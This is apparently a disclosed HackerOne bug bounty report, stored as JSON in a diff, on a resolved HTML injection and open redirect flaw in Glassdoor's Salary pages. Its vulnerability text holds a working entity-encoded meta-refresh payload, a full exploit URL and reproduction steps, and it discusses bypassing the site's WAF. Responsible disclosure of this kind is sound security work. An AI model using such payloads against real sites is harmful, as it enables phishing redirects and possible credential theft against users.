@@ -1,0 +1,119 @@
+{
+  "id": 789689,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODk2ODk=",
+  "url": "https://hackerone.com/reports/789689",
+  "title": "XSS at https://www.glassdoor.com/Salary/* via filter.jobTitleExact",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-02-06T00:49:29.522Z",
+  "submitted_at": "2020-02-06T00:49:29.522Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bendtheory",
+    "url": "/bendtheory",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/090/338/ae5c7ca6c132f4cdf326c4436691c4d56ba7ade4_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 204,
+    "url": "https://hackerone.com/glassdoor",
+    "handle": "glassdoor",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/u258rsub76htn189l6jc17ycwrc4/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/u258rsub76htn189l6jc17ycwrc4/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Glassdoor",
+      "twitter_handle": "glassdoor",
+      "website": "https://www.glassdoor.com/",
+      "about": "Your work people are here"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-04-09T13:37:44.805Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-12-08T17:56:07.113Z",
+  "team_member_agreed_on_going_public_at": "2021-04-09T13:37:44.654Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \nThere exists a Cross Site Scripting and Content Injection vulnerability at https://www.glassdoor.com/Salary/* via the `filter.jobTitleExact` query parameter. Using URL encoded HTML entities, it is possible to inject HTML content and break out of the context of a <meta> tag. \n\nThe WAF does a good job blocking most javascript payloads and appears to block parentheses, backticks, and document objects. If I do find a way to bypass the WAF and execute a javascript alert or similar, I will add a comment to this report. \n\nHowever, it is still possible to inject payloads to achieve content injection and open redirects. The following `<meta>` tag redirect payload is not blocked by the WAF:\n\n```\n\"&gt;&lt;meta http-equiv=\"refresh\" content =\"0; url=//bit.ly\"&gt;\n```\nAnd here's the final URL used:\n\nhttps://www.glassdoor.com/Salary/Bain-and-Company--and-gt-and-lt-meta-http-equiv-refresh-content-0-url-bit-ly-and-gt-India-Salaries-E3752_DAO.htm?filter.jobTitleExact=%22%26gt%3B%26lt%3Bmeta+http-equiv%3D%22refresh%22+content+%3D%220%3B+url%3D%2F%2Fbit.ly%22%26gt%3B&selectedLocationString=N%2C115\n\nThe source of the page now looks like this:\n\n```html\n<meta name=\"description\" content=\"No salaries available for salaries Bain & Company in \"><meta http-equiv=\"refresh\" content=\"0; url=//bit.ly\">, but Glassdoor has India for similar job titles, locations or employers.\"/>\n```\n...which will redirect you to https://bit.ly\n\nAffected URL or select Asset from In-Scope:\n\nhttps://www.glassdoor.com/Salary/Bain-and-Company--and-gt-and-lt-meta-http-equiv-refresh-content-0-url-bit-ly-and-gt-India-Salaries-E3752_DAO.htm\n\nAffected Parameter:\n\n`filter.jobTitleExact`\n\nBrowsers tested:\nFirefox and Chrome\n\n## Steps To Reproduce:\n\n  1. Click on the prepared URL: https://www.glassdoor.com/Salary/Bain-and-Company--and-gt-and-lt-meta-http-equiv-refresh-content-0-url-bit-ly-and-gt-India-Salaries-E3752_DAO.htm?filter.jobTitleExact=%22%26gt%3B%26lt%3Bmeta+http-equiv%3D%22refresh%22+content+%3D%220%3B+url%3D%2F%2Fbit.ly%22%26gt%3B&selectedLocationString=N%2C115\n  2. You will be redirected to https://bit.ly\n\n##Impact Description: \nThis vulnerability could be used to facilitate phishing campaigns against Glassdoor users by redirecting to malicious sites. With additional research into bypassing the WAF, XSS payloads could steal sensitive cookies or steal credentials from users.\n\n## Impact\n\nThis vulnerability could be used to facilitate phishing campaigns against Glassdoor users by redirecting to malicious sites. With additional research into bypassing the WAF, XSS payloads could steal sensitive cookies or steal credentials from users.",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 102,
+  "voters": [
+    "alexandrio",
+    "ath3na",
+    "pmnh",
+    "pretorian",
+    "mass0ma",
+    "monke",
+    "bigmac4life",
+    "bendtheory",
+    "youstin",
+    "battle_angel",
+    "and 92 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 8181,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "https://www.glassdoor.com/*",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
